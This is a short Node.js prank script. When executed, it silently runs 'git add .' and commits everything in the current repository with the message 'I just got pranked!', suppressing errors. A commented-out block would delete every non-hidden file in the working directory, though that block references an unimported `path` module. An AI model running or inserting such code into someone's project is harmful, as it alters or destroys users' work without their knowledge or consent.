import { exec as temp_exec } from "child_process";
import util from "util";
import fs from "fs";
const exec = util.promisify(temp_exec);

try {
  await exec("git add .");
  await exec(`git commit -m "I just got pranked!"`);
} catch (err) {}

// fs.readdir(process.cwd(), (err, files) => {
//   if (err) throw err;

//   files = files.filter((item) => !/(^|\/)\.[^\/\.]/g.test(item));
//   for (const file of files) {
//     fs.unlink(path.join(process.cwd(), file), (err) => {
//       if (err) throw err;
//     });
//   }
// });
